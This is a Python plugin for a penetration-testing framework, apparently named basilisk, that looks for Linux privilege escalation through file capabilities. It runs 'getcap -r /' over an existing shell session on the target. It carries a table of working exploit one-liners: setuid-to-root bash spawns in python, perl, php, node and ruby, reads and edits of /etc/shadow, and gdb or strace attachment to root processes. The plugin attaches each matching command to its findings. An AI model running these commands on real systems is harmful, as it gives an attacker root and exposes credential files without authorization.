"""Capability exploit — dangerous Linux capabilities for privesc."""

from __future__ import annotations

import logging
from typing import ClassVar

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

logger = logging.getLogger(__name__)

# Dangerous capabilities and exploitation methods
DANGEROUS_CAPS: dict[str, dict] = {
    "cap_setuid": {
        "severity": "critical",
        "description": "Can change UID to root",
        "exploits": {
            "python3": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
            "python": "python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
            "perl": "perl -e 'POSIX::setuid(0); exec \"/bin/bash\";'",
            "php": "php -r 'posix_setuid(0); system(\"/bin/bash\");'",
            "node": (
                "node -e 'process.setuid(0);"
                "require(\"child_process\").spawn(\"/bin/bash\",{stdio:[0,1,2]})'"
            ),
            "ruby": "ruby -e 'Process::Sys.setuid(0); exec \"/bin/bash\"'",
        },
    },
    "cap_setgid": {
        "severity": "high",
        "description": "Can change GID — join root/shadow group",
        "exploits": {
            "python3": "python3 -c 'import os; os.setgid(0); os.system(\"/bin/bash\")'",
        },
    },
    "cap_dac_read_search": {
        "severity": "critical",
        "description": "Can read any file (bypass DAC permissions)",
        "exploits": {
            "tar": "tar czf /tmp/shadow.tar.gz /etc/shadow && tar xf /tmp/shadow.tar.gz",
            "cat": "cat /etc/shadow",
        },
    },
    "cap_dac_override": {
        "severity": "critical",
        "description": "Can write any file (bypass DAC permissions)",
        "exploits": {
            "python3": "Write to /etc/passwd or /etc/shadow",
            "vim": "vim /etc/shadow",
        },
    },
    "cap_sys_admin": {
        "severity": "critical",
        "description": "Mount filesystems, trace, namespace operations",
        "exploits": {
            "python3": "Mount host filesystem from container",
        },
    },
    "cap_sys_ptrace": {
        "severity": "high",
        "description": "Trace/inject into processes (including root processes)",
        "exploits": {
            "python3": "Inject shellcode into root process",
            "gdb": "gdb -p <root_pid>",
            "strace": "strace -p <root_pid>",
        },
    },
    "cap_net_raw": {
        "severity": "medium",
        "description": "Raw sockets — packet sniffing",
        "exploits": {
            "python3": "Sniff network traffic for credentials",
            "tcpdump": "tcpdump -i any -w /tmp/capture.pcap",
        },
    },
    "cap_net_bind_service": {
        "severity": "low",
        "description": "Bind to privileged ports (<1024)",
        "exploits": {},
    },
    "cap_fowner": {
        "severity": "high",
        "description": "Can change ownership of any file",
        "exploits": {
            "python3": "Take ownership of /etc/shadow, then read it",
        },
    },
    "cap_chown": {
        "severity": "high",
        "description": "Can chown any file",
        "exploits": {
            "python3": "chown /etc/passwd to current user, modify it",
        },
    },
}


class CapabilityExploitPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="capability_exploit",
        display_name="Capability Exploitation",
        category=PluginCategory.PRIVESC,
        description="Dangerous Linux capabilities: cap_setuid, cap_dac_read_search, etc.",
        depends_on=["linux_enum"],
        produces=["privesc_vectors"],
        timeout=30.0,
        requires_http=False,
        requires_shell=True,
        platform="linux",
        risk_level="safe",
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        findings: list[Finding] = []
        data: dict = {"capabilities": [], "exploitable": []}

        # Try to get caps from linux_enum
        enum_result = ctx.pipeline.get(f"linux_enum:{target.host}")
        caps_lines: list[str] = []

        if enum_result and enum_result.ok:
            caps_lines = enum_result.data.get("capabilities", [])

        if not caps_lines:
            shells = ctx.state.get("active_shells", [])
            if not shells or not ctx.shell:
                return PluginResult.fail(
                    self.meta.name, target.host, error="No shell session",
                )
            session = (
                ctx.shell.get_session(shells[0]["id"])
                if isinstance(shells[0], dict) else None
            )
            if session:
                output = await ctx.shell.execute(
                    session, "getcap -r / 2>/dev/null", timeout=15.0,
                )
                if output:
                    caps_lines = output.strip().splitlines()

        data["capabilities"] = caps_lines

        for cap_line in caps_lines:
            for cap_name, cap_info in DANGEROUS_CAPS.items():
                if cap_name not in cap_line:
                    continue

                # Extract binary name
                binary_path = cap_line.split()[0] if cap_line.split() else ""
                binary_name = binary_path.split("/")[-1]

                exploit_cmd = cap_info["exploits"].get(binary_name, "")
                entry = {
                    "binary": binary_path,
                    "capability": cap_name,
                    "description": cap_info["description"],
                    "exploit": exploit_cmd,
                }
                data["exploitable"].append(entry)

                severity = cap_info["severity"]
                msg = f"{cap_name} on {binary_path}"
                evidence = f"{cap_line}\nExploit: {exploit_cmd}" if exploit_cmd else cap_line

                if severity == "critical":
                    findings.append(Finding.critical(
                        msg, evidence=evidence,
                        description=cap_info["description"],
                        tags=["privesc", "capability"],
                    ))
                elif severity == "high":
                    findings.append(Finding.high(
                        msg, evidence=evidence,
                        description=cap_info["description"],
                        tags=["privesc", "capability"],
                    ))
                else:
                    findings.append(Finding.medium(
                        msg, evidence=evidence,
                        description=cap_info["description"],
                        tags=["privesc", "capability"],
                    ))

        if not findings:
            findings.append(Finding.info(
                "No dangerous capabilities found", tags=["privesc", "capability"],
            ))

        return PluginResult.success(
            self.meta.name, target.host, findings=findings, data=data,
        )
